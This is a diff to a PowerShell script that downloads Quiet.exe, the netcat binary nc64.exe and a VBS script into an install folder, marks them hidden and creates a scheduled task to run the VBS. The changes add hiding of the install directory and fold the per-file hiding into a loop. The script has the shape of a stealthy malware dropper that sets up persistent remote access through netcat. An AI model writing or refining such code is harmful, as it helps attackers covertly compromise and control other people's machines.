@@ -23,6 +23,9 @@ if (-not (Test-Path $installPath)) {
     New-Item -ItemType Directory -Path $installPath -Force | Out-Null
 }
 
+# Make the installation directory hidden
+attrib +H $installPath
+
 # File download paths
 $quietTxtPath = Join-Path $installPath "Quiet.exe"
 $nc64TxtPath = Join-Path $installPath "nc64.exe"
@@ -37,10 +40,11 @@ Invoke-WebRequest -Uri $quietTxtUrl -OutFile $quietTxtPath
 Invoke-WebRequest -Uri $nc64TxtUrl -OutFile $nc64TxtPath
 Invoke-WebRequest -Uri $scriptVbsUrl -OutFile $scriptVbsPath
 
-# Make the downloaded files hidden
-attrib +H $quietTxtPath
-attrib +H $nc64TxtPath
-attrib +H $scriptVbsPath
+# Make all the downloaded files hidden
+$filesToHide = @($quietTxtPath, $nc64TxtPath, $scriptVbsPath)
+foreach ($file in $filesToHide) {
+    attrib +H $file
+}
 
 # Create a scheduled task
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
